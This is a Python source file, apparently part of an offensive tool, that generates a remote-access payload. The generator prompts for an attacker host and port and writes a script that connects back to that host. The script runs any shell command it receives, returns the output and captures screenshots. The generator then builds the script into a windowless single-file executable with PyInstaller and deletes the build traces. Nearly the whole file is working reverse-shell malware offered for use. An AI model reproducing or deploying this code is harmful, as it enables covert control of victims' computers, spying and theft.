from termcolor import colored
from shutil import rmtree
import subprocess
import time
import sys
import os

answers = ["y", "yes", "n", "no"]

def generate_payload(color):
	while True:
		lhost = input("LHOST" + colored(" > ", color))
		lport = input("LPORT" + colored(" > ", color))
		name = input("name for payload file" + colored(" > ", color))

		check = ""

		while check.lower() not in answers:
			check = input("Are options correct? [Y/n]: ")

		if check.lower() == "y" or check.lower() == "yes":
			break

	fullname = name + ".py"

	with open(fullname, "w") as p:
		p.write("""
import os, socket
import datetime
from PIL import ImageGrab
import subprocess
from subprocess import PIPE

s = socket.socket()

def connection():
	s.connect(('""" + lhost + """',""" + lport + """))
	udata = ''
	
	while udata != "exit":
		data = s.recv(4096)
		print(data.decode())
		udata = data.decode()

		if udata == 'screenshot':
			screenshot()
		elif udata.startswith("os "):
			command = udata[3:].split(" ")
			print(command)
			proc = subprocess.Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
			output = proc.communicate()

			for line in output: 
				s.send(line)

	s.close()

def screenshot():
	screen = ImageGrab.grab()
	time = datetime.datetime.now().strftime("%d-%b-%Y %H-%M-%S")
	name = str(time) + '.png'
	screen.save(name, 'PNG')
	print("screenshot saved")

connection()""")
	print("===== COMPILING =====")
	proc = subprocess.Popen("pyinstaller -w -F " + os.getcwd() + "/" + fullname, shell=True, stdout=subprocess.PIPE)
	proc.wait()
	print("=====================")

	try:
		rmtree("build")
		rmtree("__pycache__")
		os.remove(name + ".spec")
		os.remove(fullname)
		print(colored("Payload file saved to ./dist", "green"))
	except:
		print(colored("Something went wrong!", "red"))

	return name, lport